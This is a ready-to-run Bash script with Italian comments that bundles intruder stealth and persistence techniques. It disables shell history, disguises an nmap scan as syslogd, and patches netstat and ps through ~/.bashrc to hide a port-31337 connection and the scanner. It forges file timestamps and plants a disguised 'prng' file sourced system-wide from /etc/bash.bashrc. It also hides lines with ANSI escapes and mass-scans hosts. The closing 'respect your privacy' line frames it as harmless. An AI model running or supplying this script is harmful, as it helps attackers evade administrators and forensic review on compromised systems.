#!/bin/bash

# Nascondi la cronologia dei comandi Bash
nascondi_bash_history() {
    export HISTFILE=/dev/null
    unset SSH_CONNECTION SSH_CLIENT
}

# "Suicidati" quando si esce dalla shell
suicidati() {
    alias exit='kill -9 $$'
}

# Nascondi un comando aggiungendo uno spazio prima
nascondi_comando() {
    alias " id"=''
}

# Daemonizza un comando
daemonizza_comando() {
    (exec -a syslogd nmap -T0 10.0.2.1/24) &
}

# Nascondi le opzioni di un comando
nascondi_opzioni_comando() {
    ./zapper -a klog nmap -T0 10.0.0.1/24
}

# Nascondi una connessione usando una funzione Bash in ~/.bashrc
nascondi_connessione_netstat() {
    echo 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }' >>~/.bashrc \
    && touch -r /etc/passwd ~/.bashrc
}

# Nascondi un processo usando una funzione Bash in ~/.bashrc
nascondi_processo() {
    echo 'ps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >>~/.bashrc \
    && touch -r /etc/passwd ~/.bashrc
}

# Nascondi un processo come utente root
nascondi_processo_root() {
    local pid=$1
    hide $pid
}

# Nascondi uno script shell includendolo in ~/.bashrc
nascondi_script_shell() {
    echo -e 'netstat(){ command netstat "$@" | grep -Fv -e :31337 -e 1.2.3.4; }\
            \nps(){ command ps "$@" | exec -a GREP grep -Fv -e nmap  -e GREP; }' >/usr/bin/prng \
            && echo ". prng #Initialize Pseudo Random Number Generator" >>/etc/bash.bashrc \
            && touch -r /etc/ld.so.conf /usr/bin/prng /etc/bash.bashrc
}

# Nascondi l'output del comando "id" usando caratteri di escape ANSI
nascondi_da_cat() {
    echo -e "id #\\033[2K\\033[1A" >>~/.bashrc
}

# Esegui comandi in parallelo su un elenco di host
esegui_in_parallelo() {
    cat hosts.txt | parallel -j20 'exec nmap -n -Pn -sCV -F --open {} >nmap_{}.txt'
}

# Utilizzo
nascondi_bash_history
suicidati
nascondi_comando
daemonizza_comando
nascondi_opzioni_comando
nascondi_connessione_netstat
nascondi_processo
nascondi_processo_root 31337  # Specifica il PID del processo da nascondere
nascondi_script_shell
nascondi_da_cat
esegui_in_parallelo

echo "Rispetta la tua privacy"
